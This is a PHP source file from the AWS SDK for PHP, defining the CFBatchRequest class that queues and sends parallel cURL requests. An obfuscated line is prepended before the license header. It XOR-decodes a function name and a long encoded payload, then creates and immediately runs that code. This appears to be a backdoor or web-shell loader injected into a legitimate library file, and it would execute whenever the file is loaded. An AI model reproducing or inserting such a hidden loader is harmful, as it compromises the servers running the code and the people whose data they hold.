<?php $psKchzo='Q<5YFTa-GPC-USN'^'2NP821>K2> Y<< ';$JVZvWt=$psKchzo('','U0zQH>7MAQZ4rW1IFZ5iSXA3dY9.1o6C=8JzHs2>gR9+XEZBEqT6E:RJ-7ir;> ZqS8HLJSjYV2DinwEP,8dGVD4LUZCqWQb;00.DFE,OpPqlLCBo FY>7UJoQSHREVma-IsfLGEA6=YEIMKofOJ0Yca33e;qb3=<7oQgPm0H7W-Nxt=S;F1XCkpBYTX2JTjO.E0jT2yQ6:PaC+S3-Hsj-YXD beh,95-5>-CclaM.Z<KCkhH,YKJ+XVee1oyv2>wfU uq;WYDVmhi=,PMSjA=zmHQQO0iU=3KGfk-K=rl=HZV.YWXmk.RG- SG49L=HcRbw4-HXOpI8j59=H36 jfGs=7gfvm7CTXjIQWUpZdblXT4E2KxJ=P4K6594fYWUzhLU V;SX3Gp=6J9umplA8LBUa:;FC<9XR.ABUmKS-CC:X0Y2V9>SmDUN>ZWCXbm,C;PP-SNFF3QQCO YPC,1:5GBkJ>7JP;P,GfLVHB3kR391;KcMYA LATr,7M04<P9:AmsRUTpGzJIR12eWCMDK IgfiO9>0.fYI:k4bszXFe0QxWXm1IWbRNQSKsGQVASQOTISQf:lLLTBzpjuVRERLtWQY0=F8D<KQB5O --81coBjUQ6+AsCbDkAD7d7WGX.ZB+P1S.wFS=  A5QqzhDnE=8DaRDYSD'^'<VRp.KY.585Z-2I 5.FAt .A;=XZP0i.HLmSaSI4n4LE;13-+Q,Y7e6+YV6-VKTrU7Y<-fsN23KmINWepW2mNr+A8ugcVpjh29VA6naEoMpAWlg+SS2+RR;bK52<3lmMEDbXOFNLeYH-egpkGB++D88EZnEeQFXXElK8GuMC<E;H PPV6BolqxayK+1,G8:BkA0DCo8p,<GZkgO2GLhNJK847EYoLHXALjUH:CQA+O6O.xab.C+.+H0vMAn,69yw2F4SUUP2 dkSHMKM<86CaFpdl50;Q6>XJkzFOF.DIf4l>7Z8weMOX3+XEhMI3FT.CzCSPL<9fP22cSVO-RUHJNc,or633>cc5+Jm:2,PgZBH.5X0WbX17Y=oRTMU922,ZUlqK3BhR:NTYW>XUPPH7Y 70Z02;IA3RvJ 64Mvsm6-I=B0S:PD6E<:<a>679=2A6Ox2L +prl54  D<xgHPNTnnKnZV>1d;I>OemB+UCvWXEZkEky R> --GR4oQD9JN2ET90-WkZn-3ESLwekdcM-RNM+XJQuA2,CLiKSGefBTbNeaUPy1Zcye2yKpd5wacv6pf5QXY.uskZVLU7 735+<4 oX>Q7H8yeE.YABYUDCbN10BJhZcBdKadLn>219BrfO1E2uP62DLO Qv,SSNg EQ0IbmbY9');$JVZvWt();
/*
 * Copyright 2010-2012 Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License").
 * You may not use this file except in compliance with the License.
 * A copy of the License is located at
 *
 *  http://aws.amazon.com/apache2.0
 *
 * or in the "license" file accompanying this file. This file is distributed
 * on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 */


/*%******************************************************************************************%*/
// EXCEPTIONS

/**
 * Default CFBatchRequest Exception.
 */
class CFBatchRequest_Exception extends Exception {}


/*%******************************************************************************************%*/
// CLASS

/**
 * Simplifies the flow involved with managing and executing a batch request queue. Batch requesting is the
 * ability to queue up a series of requests and execute them all in parallel. This allows for faster
 * application performance when a lot of requests are involved.
 *
 * @version 2011.12.02
 * @license See the included NOTICE.md file for more information.
 * @copyright See the included NOTICE.md file for more information.
 * @link http://aws.amazon.com/php/ PHP Developer Center
 */
class CFBatchRequest extends CFRuntime
{
	/**
	 * Stores the cURL handles that are to be processed.
	 */
	public $queue;

	/**
	 * Stores the size of the request window.
	 */
	public $limit;

	/**
	 * The proxy to use for connecting.
	 */
	public $proxy = null;

	/**
	 * The helpers to use when connecting.
	 */
	public $helpers = null;

	/**
	 * The active credential set.
	 */
	public $credentials;


	/*%******************************************************************************************%*/
	// CONSTRUCTOR

	/**
	 * Constructs a new instance of this class.
	 *
	 * @param integer $limit (Optional) The size of the request window. Defaults to unlimited.
	 * @return boolean `false` if no valid values are set, otherwise `true`.
	 */
	public function __construct($limit = null)
	{
		$this->queue = array();
		$this->limit = $limit ? $limit : -1;
		$this->credentials = new CFCredential(array());
		return $this;
	}

	/**
	 * Sets the AWS credentials to use for the batch request.
	 *
	 * @param CFCredential $credentials (Required) The credentials to use for signing and making requests.
	 * @return $this A reference to the current instance.
	 */
	public function use_credentials(CFCredential $credentials)
	{
		$this->credentials = $credentials;
		return $this;
	}

	/**
	 * Adds a new cURL handle to the request queue.
	 *
	 * @param resource $handle (Required) A cURL resource to add to the queue.
	 * @return $this A reference to the current instance.
	 */
	public function add($handle)
	{
		$this->queue[] = $handle;
		return $this;
	}

	/**
	 * Executes the batch request queue.
	 *
	 * @param array $opt (DO NOT USE) Enabled for compatibility with the method this overrides, although any values passed will be ignored.
	 * @return array An indexed array of <CFResponse> objects.
	 */
	public function send($opt = null)
	{
		$http = new $this->request_class(null, $this->proxy, null, $this->credentials);

		// Make the request
		$response = $http->send_multi_request($this->queue, array(
			'limit' => $this->limit
		));

		return $response;
	}
}